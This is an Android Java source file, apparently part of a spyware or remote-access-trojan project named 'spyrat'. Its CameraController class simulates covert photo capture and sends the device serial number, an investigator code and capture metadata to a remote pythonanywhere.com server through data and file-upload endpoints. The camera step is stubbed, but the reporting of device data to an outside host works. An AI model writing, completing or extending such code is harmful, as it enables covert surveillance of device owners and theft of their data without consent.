package com.spyrat.investigation;

import android.content.Context;
import android.hardware.Camera;
import android.util.Log;
import org.json.JSONObject;
import java.io.FileOutputStream;

public class CameraController {
    private static final String TAG = "SpyratCamera";
    private static final String UPLOAD_FILE_URL = "https://GhostTester.pythonanywhere.com/api/investigator/upload-file";
    private static Camera camera;

    public static void capturePhoto(Context context, JSONObject parameters) {
        try {
            Log.d(TAG, "📸 Starting photo capture...");
            
            // Simulate photo capture (in real implementation, use Camera2 API)
            JSONObject photoData = new JSONObject();
            photoData.put("action", "photo_capture");
            photoData.put("timestamp", System.currentTimeMillis());
            photoData.put("status", "success");
            photoData.put("resolution", "1920x1080");
            photoData.put("file_size", "2.5MB");
            photoData.put("file_name", "photo_" + System.currentTimeMillis() + ".jpg");
            
            // Send capture confirmation
            sendPhotoData(context, android.os.Build.SERIAL, 
                getInvestigatorCode(context), photoData);
                
            // Simulate file upload
            simulateFileUpload(context, photoData.getString("file_name"));
                
        } catch (Exception e) {
            Log.e(TAG, "❌ Camera error: " + e.getMessage());
        }
    }

    private static void sendPhotoData(Context context, String deviceId, String investigatorCode, JSONObject photoData) {
        try {
            JSONObject postData = new JSONObject();
            postData.put("device_id", deviceId);
            postData.put("investigator_code", investigatorCode);
            postData.put("data_type", "camera_photo");
            postData.put("data_content", photoData);

            NetworkManager.sendPost("https://GhostTester.pythonanywhere.com/api/investigator/data", postData.toString());
            Log.d(TAG, "✅ Photo capture data sent");
        } catch (Exception e) {
            Log.e(TAG, "❌ Photo send error: " + e.getMessage());
        }
    }

    private static void simulateFileUpload(Context context, String fileName) {
        try {
            JSONObject uploadData = new JSONObject();
            uploadData.put("device_id", android.os.Build.SERIAL);
            uploadData.put("investigator_code", getInvestigatorCode(context));
            uploadData.put("file_name", fileName);
            uploadData.put("file_type", "image/jpeg");
            uploadData.put("file_size", "2500000");
            uploadData.put("upload_status", "completed");
            uploadData.put("timestamp", System.currentTimeMillis());

            String response = NetworkManager.sendPost(UPLOAD_FILE_URL, uploadData.toString());
            if (response != null) {
                Log.d(TAG, "✅ File upload simulated: " + fileName);
            } else {
                Log.e(TAG, "❌ File upload failed");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ File upload error: " + e.getMessage());
        }
    }

    private static String getInvestigatorCode(Context context) {
        return "INVESTIGATOR_001";
    }
}
